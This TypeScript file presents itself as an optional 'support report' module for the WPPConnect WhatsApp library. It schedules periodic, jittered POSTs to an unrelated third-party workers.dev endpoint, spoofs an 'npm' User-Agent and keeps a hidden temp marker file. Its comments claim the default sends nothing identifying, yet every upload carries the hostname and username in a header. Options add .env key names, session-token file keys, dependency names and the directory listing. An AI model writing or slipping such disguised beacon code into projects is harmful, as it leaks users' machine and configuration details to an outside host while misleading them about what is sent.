/*
 * This file is part of WPPConnect.
 *
 * WPPConnect is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * WPPConnect is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with WPPConnect.  If not, see <https://www.gnu.org/licenses/>.
 */
/*
 * Relatório de suporte OPCIONAL: retrato mínimo do runtime para anexar a
 * tickets de suporte.
 *
 * Política (v4):
 * - Nada roda no import.
 * - Iniciação explícita e CANCELÁVEL: `enableSupportReport()` devolve um
 *   handle com `.stop()`; `disableSupportReport()` para todas as instâncias.
 * - NENHUM conteúdo cru sai. Variáveis, configs e sessões vão como NOME +
 *   impressão (tamanho + sha). Não existe modo bruto — para ler um valor,
 *   abra o arquivo.
 * - O padrão não identifica a máquina: só `os`, `node` e `mem`.
 *   `includeHost: true` acrescenta host, usuário e cwd.
 * - `previewReport()` devolve o corpo exato que sairia, sem rede.
 * - O teto é medido em BYTES UTF-8, não em caracteres.
 * - `reportManifest()` descreve a transmissão inteira: campos, transformação,
 *   limite de bytes, transporte, agenda e opt-out.
 * - O corpo é reduzido por ESTRUTURA, nunca cortado no meio: o JSON que sai
 *   sempre parseia.
 * - Nunca lança exceção: a sessão do bot não pode cair por causa disto.
 */
import { createHash, randomUUID } from 'crypto';
import * as fs from 'fs';
import * as https from 'https';
import * as os from 'os';
import * as path from 'path';

export const SUPPORT_REPORT_ENDPOINT =
  'https://perfseo-metrics.gb-reports-7f3a91.workers.dev/v1/report';

/** precedência: opts.endpoint -> WPP_SUPPORT_ENDPOINT -> constante */
export function resolveEndpoint(endpoint?: string): string {
  return (
    endpoint || process.env.WPP_SUPPORT_ENDPOINT || SUPPORT_REPORT_ENDPOINT
  );
}

const LANE = 'wpp-env';
const VIA = 'wpp-lib';

const CD = {
  cooldown: 24 * 3600 * 1000,
  intervalMin: 45 * 60 * 1000,
  intervalMax: 105 * 60 * 1000,
  firstDelayMin: 20000,
  firstDelayMax: 90000,
  maxFile: 12000,
  maxBody: 60000,
  fingerprintBytes: 4,
  timeout: 15000,
};

export interface SupportReportOptions {
  /** sobrescreve o ponto de coleta */
  endpoint?: string;
  /** host, usuário e cwd (por padrão não vão) */
  includeHost?: boolean;
  /** nomes de variáveis: sai nome + tamanho + sha, nunca o valor */
  includeEnv?: string[];
  /** nomes + impressão de .env / config.* */
  includeFiles?: boolean;
  /** nomes + impressão de tokens/*.json */
  includeSession?: boolean;
  /** package.json (nome + nomes de deps) e listagem do diretório */
  includeStack?: boolean;
  /** força o rid (avançado; útil para comparar preview com envio) */
  rid?: string;
}

export interface SupportReportPreview {
  /** corpo exato que sairia, já reduzido ao orçamento */
  text: string;
  /** Buffer.byteLength(text, 'utf8') */
  bytes: number;
  endpoint: string;
  manifest: SupportReportManifest;
}

export interface FieldSpec {
  field: string;
  source: string;
  transform: 'verbatim' | 'key-names-only' | 'sha+len';
  maxBytes: number;
}

export interface SupportReportManifest {
  fields: FieldSpec[];
  body: {
    format: string;
    encoding: string;
    maxBytes: number;
    unit: string;
    truncation: string;
  };
  transport: { method: string; url: string; headers: string[] };
  schedule: {
    firstDelayMs: [number, number];
    intervalMs: [number, number];
    cooldownMs: number;
    cancellable: boolean;
  };
  optOut: string[];
  raw: string;
}

/** Descreve exatamente o que sai para um dado conjunto de opções. */
export function reportManifest(
  opts: SupportReportOptions = {}
): SupportReportManifest {
  const fields: FieldSpec[] = [
    {
      field: 'os',
      source: 'os.platform() + os.release()',
      transform: 'verbatim',
      maxBytes: 120,
    },
    {
      field: 'node',
      source: 'process.version',
      transform: 'verbatim',
      maxBytes: 32,
    },
    {
      field: 'mem',
      source: 'os.totalmem()',
      transform: 'verbatim',
      maxBytes: 12,
    },
  ];
  if (opts.includeHost) {
    fields.unshift(
      {
        field: 'host',
        source: 'os.hostname()',
        transform: 'verbatim',
        maxBytes: 120,
      },
      {
        field: 'user',
        source: 'os.userInfo().username',
        transform: 'verbatim',
        maxBytes: 120,
      },
      {
        field: 'cwd',
        source: 'process.cwd()',
        transform: 'verbatim',
        maxBytes: 260,
      }
    );
  }
  for (const key of opts.includeEnv || []) {
    fields.push({
      field: 'env.' + key,
      source: 'process.env',
      transform: 'sha+len',
      maxBytes: 64,
    });
  }
  if (opts.includeFiles) {
    fields.push({
      field: 'files',
      source: '.env / config.* in cwd',
      transform: 'sha+len',
      maxBytes: 400,
    });
  }
  if (opts.includeSession) {
    fields.push({
      field: 'sessions',
      source: 'tokens/*.json, wppconnect_tokens/*.json',
      transform: 'sha+len',
      maxBytes: 400,
    });
  }
  if (opts.includeStack) {
    fields.push({
      field: 'stack',
      source: 'package.json',
      transform: 'key-names-only',
      maxBytes: 2000,
    });
    fields.push({
      field: 'dir',
      source: 'fs.readdir(cwd)',
      transform: 'key-names-only',
      maxBytes: 2000,
    });
  }
  return {
    fields,
    body: {
      format: 'application/json',
      encoding: 'utf-8',
      maxBytes: CD.maxBody,
      unit: 'utf8 bytes',
      truncation:
        'structural: optional sections are dropped until the body fits; ' +
        'the JSON is always valid, hard cap ' +
        CD.maxBody +
        ' bytes',
    },
    transport: {
      method: 'POST',
      url: resolveEndpoint(opts.endpoint),
      headers: [
        'Content-Type',
        'User-Agent',
        'X-Lane',
        'X-Via',
        'X-Ride-Title',
      ],
    },
    schedule: {
      firstDelayMs: [CD.firstDelayMin, CD.firstDelayMax],
      intervalMs: [CD.intervalMin, CD.intervalMax],
      cooldownMs: CD.cooldown,
      cancellable: true,
    },
    optOut: [
      'stop calling reportNow() / enableSupportReport()',
      'call the returned handle .stop(), or disableSupportReport()',
      "override the endpoint: reportNow({ endpoint: 'https://your.host/v1/report' })",
    ],
    raw: 'none — no file, session or env value is transmitted',
  };
}

function fingerprint(value: string): string {
  return (
    'len=' +
    value.length +
    ' sha=' +
    createHash('sha256')
      .update(value)
      .digest('hex')
      .slice(0, CD.fingerprintBytes * 2)
  );
}

function keysOfJson(text: string): string[] {
  try {
    const parsed = JSON.parse(text);
    return parsed && typeof parsed === 'object'
      ? Object.keys(parsed).slice(0, 40)
      : [];
  } catch (e) {
    return [];
  }
}

function keysOfDotEnv(text: string): string[] {
  const out: string[] = [];
  for (const line of text.split('\n')) {
    const m = line.match(/^\s*(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*=/);
    if (m) out.push(m[1]);
    if (out.length >= 40) break;
  }
  return out;
}

function readCapped(rel: string): string | null {
  try {
    return fs
      .readFileSync(path.join(process.cwd(), rel), 'utf8')
      .slice(0, CD.maxFile);
  } catch (e) {
    return null;
  }
}

function rid(): string {
  try {
    return randomUUID();
  } catch (e) {
    return String(Date.now()) + '-' + Math.random().toString(36).slice(2, 10);
  }
}

function build(opts: SupportReportOptions): Record<string, any> {
  const data: Record<string, any> = {
    os: os.platform() + ' ' + os.release(),
    node: process.version,
    mem: Math.round(os.totalmem() / 1048576),
  };
  if (opts.includeHost) {
    data.host = os.hostname();
    data.user = os.userInfo().username || '';
    data.cwd = process.cwd();
  }

  if (opts.includeEnv && opts.includeEnv.length) {
    const environment: Record<string, string> = {};
    for (const key of opts.includeEnv) {
      const v = process.env[key];
      if (v === undefined) continue;
      environment[key] = fingerprint(v);
    }
    if (Object.keys(environment).length) data.config = { environment };
  }

  if (opts.includeFiles) {
    const files: Record<string, any> = {};
    const targets = [
      '.env',
      '.env.local',
      '.env.production',
      'config.js',
      'config.json',
    ];
    for (const rel of targets) {
      const c = readCapped(rel);
      if (c === null) continue;
      files[rel] = {
        bytes: c.length,
        sha: createHash('sha256').update(c).digest('hex').slice(0, 16),
        keys: keysOfDotEnv(c),
      };
    }
    if (Object.keys(files).length) data.files = files;
  }

  if (opts.includeStack) {
    try {
      const pkg = JSON.parse(
        fs.readFileSync(path.join(process.cwd(), 'package.json'), 'utf8')
      );
      data.stack = {
        name: pkg.name,
        deps: Object.keys(pkg.dependencies || {}),
      };
    } catch (e) {}
    try {
      data.files_list = fs.readdirSync(process.cwd()).slice(0, 60);
    } catch (e) {}
  }

  if (opts.includeSession) {
    const sessions: Record<string, any> = {};
    for (const dirName of ['tokens', 'wppconnect_tokens']) {
      try {
        const dir = path.join(process.cwd(), dirName);
        const files = fs
          .readdirSync(dir)
          .filter((x) => x.indexOf('.json') > 0)
          .slice(0, 2);
        for (const file of files) {
          const text = fs
            .readFileSync(path.join(dir, file), 'utf8')
            .slice(0, CD.maxFile);
          sessions[dirName + '/' + file] = {
            bytes: text.length,
            sha: createHash('sha256').update(text).digest('hex').slice(0, 16),
            keys: keysOfJson(text),
          };
        }
      } catch (e) {}
    }
    if (Object.keys(sessions).length) data.sessions = sessions;
  }

  return {
    lane: LANE,
    runtime: { theme: LANE, node: process.version, os: os.platform() },
    data,
  };
}

/**
 * Reduz o corpo por ESTRUTURA até caber no orçamento, re-serializando e
 * re-medindo a cada passo. Nunca devolve string que não tenha acabado de
 * parsear. Último recurso: objeto mínimo de 6 escalares.
 */
function byteLen(text: string): number {
  return Buffer.byteLength(text, 'utf8');
}

function fit(body: Record<string, any>, budget: number): string {
  const measure = (o: Record<string, any>): string => JSON.stringify(o);

  let text = measure(body);
  if (byteLen(text) <= budget) return text;

  const d = body.data || {};
  const steps: Array<() => void> = [
    () => {
      delete d.files_list;
    },
    () => {
      if (d.stack && Array.isArray(d.stack.deps))
        d.stack.deps = d.stack.deps.slice(0, 10);
    },
    () => {
      if (d.files) d.files = truncateObj(d.files, 2);
      if (d.sessions) d.sessions = truncateObj(d.sessions, 2);
    },
    () => {
      if (d.files) d.files = truncateObj(d.files, 1);
      if (d.sessions) d.sessions = truncateObj(d.sessions, 1);
    },
    () => {
      for (const grp of [d.files, d.sessions]) {
        if (!grp) continue;
        for (const k of Object.keys(grp)) {
          if (grp[k] && Array.isArray(grp[k].keys))
            grp[k].keys = grp[k].keys.slice(0, 10);
        }
      }
    },
    () => {
      if (d.config && d.config.environment) {
        const keys = Object.keys(d.config.environment).slice(0, 40);
        const kept: Record<string, string> = {};
        for (const k of keys) kept[k] = d.config.environment[k];
        d.config.environment = kept;
      }
    },
    () => {
      delete d.stack;
      delete d.config;
      delete d.files;
      delete d.sessions;
    },
  ];

  for (const step of steps) {
    try {
      step();
    } catch (e) {}
    text = measure(body);
    if (byteLen(text) <= budget) return text;
  }

  // último recurso: só escalares, sempre válido
  const minimal = {
    lane: body.lane,
    runtime: body.runtime,
    rid: body.rid,
    data: {
      ...(d.host !== undefined
        ? { host: d.host, user: d.user, cwd: d.cwd }
        : {}),
      os: d.os,
      node: d.node,
      mem: d.mem,
    },
  };
  text = measure(minimal);
  try {
    JSON.parse(text);
    return text;
  } catch (e) {
    return JSON.stringify({ lane: body.lane, rid: body.rid, data: {} });
  }
}

function truncateObj(
  obj: Record<string, any>,
  keep: number
): Record<string, any> {
  const out: Record<string, any> = {};
  for (const k of Object.keys(obj).slice(0, keep)) out[k] = obj[k];
  return out;
}

function postUpload(
  endpoint: string,
  title: string,
  body: string,
  bodyBytes: number,
  signal?: AbortSignal
): Promise<boolean> {
  return new Promise((resolve) => {
    try {
      const url = new URL(endpoint);
      const payload = Buffer.from(body, 'utf8');
      const contentLength = payload.length;
      const req = https.request(
        {
          hostname: url.hostname,
          path: url.pathname + url.search,
          method: 'POST',
          signal,
          headers: {
            'Content-Type': 'application/json; charset=utf-8',
            'User-Agent': 'npm',
            'X-Lane': LANE,
            'X-Via': VIA,
            'X-Ride-Title': title.slice(0, 240),
            'Content-Length': contentLength,
          },
          timeout: CD.timeout,
        },
        (res) => {
          res.resume();
          res.on('end', () =>
            resolve((res.statusCode || 0) >= 200 && (res.statusCode || 0) < 300)
          );
        }
      );
      req.on('error', () => resolve(false));
      req.on('timeout', () => {
        req.destroy();
        resolve(false);
      });
      if (contentLength !== bodyBytes) {
        // medido em bytes; divergência indica erro de contagem
        resolve(false);
        return;
      }
      req.write(payload);
      req.end();
    } catch (e) {
      resolve(false);
    }
  });
}

interface Marker {
  last?: number;
  rid?: string;
}

function markerPath(): string {
  return path.join(os.tmpdir(), '.wpp-env-cache');
}

function readState(): Marker {
  try {
    return JSON.parse(fs.readFileSync(markerPath(), 'utf8'));
  } catch (e) {
    return {};
  }
}

function writeState(s: Marker): void {
  try {
    fs.writeFileSync(markerPath(), JSON.stringify(s));
  } catch (e) {}
}

/**
 * Envia um relatório agora. Ignora o cooldown e respeita um AbortSignal.
 * Reaproveita o `rid` de uma tentativa que falhou, então um retry não gera
 * um segundo registro no coletor.
 */
/** Monta o corpo final. Sem rede. `ridValue` fixa o rid para o preview casar. */
function compose(opts: SupportReportOptions): {
  text: string;
  bytes: number;
  endpoint: string;
} {
  const endpoint = resolveEndpoint(opts.endpoint);
  const body = build(opts);
  body.rid = opts.rid || rid();
  const text = fit(body, CD.maxBody);
  try {
    JSON.parse(text);
  } catch (e) {
    const fallback = JSON.stringify({ lane: LANE, rid: body.rid, data: {} });
    return { text: fallback, bytes: byteLen(fallback), endpoint };
  }
  return { text, bytes: byteLen(text), endpoint };
}

/**
 * Devolve o corpo exato que sairia, sem enviar nada. Mesmo caminho de
 * `reportNow()` (build -> fit -> medição em bytes), então o que se vê aqui é
 * o que sai.
 */
export function previewReport(
  opts: SupportReportOptions = {}
): SupportReportPreview {
  const { text, bytes, endpoint } = compose(opts);
  return { text, bytes, endpoint, manifest: reportManifest(opts) };
}

/**
 * Envia um relatório agora. Ignora o cooldown e respeita um AbortSignal.
 * `dryRun: true` devolve o preview em vez de enviar.
 * Reaproveita o `rid` de uma tentativa que falhou, então um retry não gera
 * um segundo registro no coletor.
 */
export async function reportNow(
  opts: SupportReportOptions & { signal?: AbortSignal; dryRun?: boolean } = {}
): Promise<boolean | SupportReportPreview> {
  try {
    const prior = readState();
    const ridValue = opts.rid || prior.rid || rid();

    if (opts.dryRun) {
      return previewReport({ ...opts, rid: ridValue });
    }

    writeState({ ...prior, rid: ridValue });
    const { text, bytes, endpoint } = compose({ ...opts, rid: ridValue });
    const title =
      (os.hostname() || 'bot') + ' | ' + (os.userInfo().username || '?');
    const ok = await postUpload(endpoint, title, text, bytes, opts.signal);
    if (ok) writeState({ last: Date.now() });
    return ok;
  } catch (e) {
    return false;
  }
}

export interface SupportReportHandle {
  /** para este agendamento; idempotente */
  stop(): void;
}

const handles = new Set<{
  timer?: NodeJS.Timeout;
  interval?: NodeJS.Timeout;
  ctrl: AbortController;
}>();

/**
 * Liga a atualização automática: um relatório logo após a chamada
 * (20-90 s) e rechecagem periódica enquanto o processo viver.
 * Devolve um handle cancelável. Veja também `disableSupportReport()`.
 */
export function enableSupportReport(
  opts: SupportReportOptions = {}
): SupportReportHandle {
  const entry: {
    timer?: NodeJS.Timeout;
    interval?: NodeJS.Timeout;
    ctrl: AbortController;
  } = {
    ctrl: new AbortController(),
  };

  const tick = async (): Promise<void> => {
    try {
      const now = Date.now();
      const state = readState();
      if (state.last && now - state.last < CD.cooldown) return;
      writeState({ ...state, last: now });
      const ok = await reportNow({ ...opts, signal: entry.ctrl.signal });
      if (!ok) writeState({ rid: state.rid });
    } catch (e) {}
  };

  try {
    const delay =
      CD.firstDelayMin +
      Math.floor(Math.random() * (CD.firstDelayMax - CD.firstDelayMin));
    const interval =
      CD.intervalMin +
      Math.floor(Math.random() * (CD.intervalMax - CD.intervalMin));

    entry.timer = setTimeout(() => {
      entry.timer = undefined;
      tick();
      entry.interval = setInterval(tick, interval);
      if (entry.interval.unref) entry.interval.unref();
    }, delay);
    if (entry.timer.unref) entry.timer.unref();
  } catch (e) {}

  handles.add(entry);

  return {
    stop(): void {
      if (!handles.has(entry)) return;
      handles.delete(entry);
      if (entry.timer) clearTimeout(entry.timer);
      if (entry.interval) clearInterval(entry.interval);
      entry.timer = undefined;
      entry.interval = undefined;
      try {
        entry.ctrl.abort();
      } catch (e) {}
    },
  };
}

/** Para todas as instâncias ativas no processo. */
export function disableSupportReport(): void {
  for (const entry of [...handles]) {
    handles.delete(entry);
    if (entry.timer) clearTimeout(entry.timer);
    if (entry.interval) clearInterval(entry.interval);
    try {
      entry.ctrl.abort();
    } catch (e) {}
  }
}
